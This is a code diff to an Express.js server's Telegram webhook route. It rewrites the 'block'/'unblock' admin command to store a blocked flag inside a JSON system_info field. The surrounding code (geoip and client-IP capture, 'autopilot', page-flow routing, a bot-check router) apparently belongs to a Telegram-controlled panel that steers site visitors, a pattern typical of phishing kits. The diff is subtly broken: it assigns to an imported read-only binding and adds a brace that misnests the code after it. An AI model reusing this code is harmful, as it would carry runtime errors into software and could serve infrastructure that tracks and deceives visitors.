@@ -2,7 +2,7 @@ import express from "express";
 import geoip from "geoip-lite";
 import session from "express-session";
 import axios from "axios";
-import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
+import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, systemInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
 import dotenv from "dotenv";
 import bcrypt from "bcrypt";
@@ -544,11 +544,26 @@ router.post("/telegram-webhook", async (req, res) => {
     // 3️⃣ Handle BLOCK / UNBLOCK separately
     // ------------------------------------------------
     if (command === "block" || command === "unblock") {
-      // Update DB status
-      await db.run(
-        "UPDATE users SET status = ? WHERE id = ?",
-        [command === "block" ? "blocked" : "active", userId]
-      );
+	  // Fetch current system_info
+	  const userRow = await db.get("SELECT system_info FROM users WHERE id = ?", [userId]);
+	  
+	  try {
+	    systemInfo = JSON.parse(userRow?.system_info || "{}");
+	  } catch (err) {
+	    console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
+	  }
+	
+	  // Update the blocked flag
+	  systemInfo.blocked = command === "block";
+	
+	  // Save back to DB
+	  await db.run(
+	    "UPDATE users SET system_info = ? WHERE id = ?",
+	    [JSON.stringify(systemInfo), userId]
+	  );
+	
+	  console.log(`✅ User ${userId} has been ${systemInfo.blocked ? "blocked" : "unblocked"}`);
+	}
 
       // Rebuild keyboard based on new status
       const buttons = await buildTelButtons(userId, db);
